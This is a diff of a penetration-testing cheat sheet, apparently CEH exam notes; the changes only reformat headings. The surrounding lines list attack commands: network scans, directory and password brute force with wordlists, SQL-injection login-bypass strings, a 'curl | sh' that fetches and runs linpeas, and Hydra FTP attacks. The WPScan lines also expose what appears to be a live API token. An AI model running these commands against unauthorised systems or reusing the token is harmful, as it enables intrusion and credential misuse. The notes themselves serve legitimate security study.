@@ -16,14 +16,14 @@ sudo gem install wpscan
 
 
 
-##NMAP
+## NMAP
 sudo nmap -O -T5 -sV -sC -oA nmap_$ip1_out_all -vv $ip1/24
 sudo xsltproc nmap_out_all.xml nmap_$ip1_out_all.html
 
 cd CEH;mkdir $ip;cd $ip;sudo nmap -O -T5 -sV -sC -oA nmap_$ip\_out_all -vv $ip/24;sudo xsltproc nmap_$ip\_out_all.xml -o nmap_$ip\_out_all.html;
 
 
-###Quick Host Discovery
+### Quick Host Discovery
 sudo nmap -O -T5 -sn $ip/24 
 sudo nmap -O -T5 -sn -PR $ip/24                   (-PR ARP requests)
 
@@ -32,10 +32,10 @@ nmap -p 3389 --script rdp-ntlm-info <target>
 
 
 
-##GoBuster
+## GoBuster
 sudo gobuster dir  -w /usr/share/wordlists/rockyou.txt -u http://$ip
 
-##SQLi
+## SQLi
 admin' --
 admin' #
 admin'/*
@@ -53,22 +53,22 @@ sudo stegseek -wl /usr/share/wordlists/rockyou.txt -sf filename
 
 snow.exe -C -p “password” stegfile.txt
 
-##Enum4Linux
+## Enum4Linux
 sudo enum4linux -U -o $ip
 
-##WPScan (https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)
+## WPScan (https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation)
 
-###Known vulns
+### Known vulns
 wpscan -e vp,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ --url <example.com>
-###All vulns:
+### All vulns:
 wpscan -e ap,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ --url <example.com>
-###Password Bruteforce
+### Password Bruteforce
 wpscan -e u --passwords /path/to/password_file.txt  --url <example.com>
 ##Linpeas Winpeas also exists apparently
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ./linpeas.sh -a > /tmp/linpeas.txt
 
-##Hydra
+## Hydra
 hydra -l <username> -P given_wordlist ftp://$ip
 https://github.com/frizb/Hydra-Cheatsheet
 
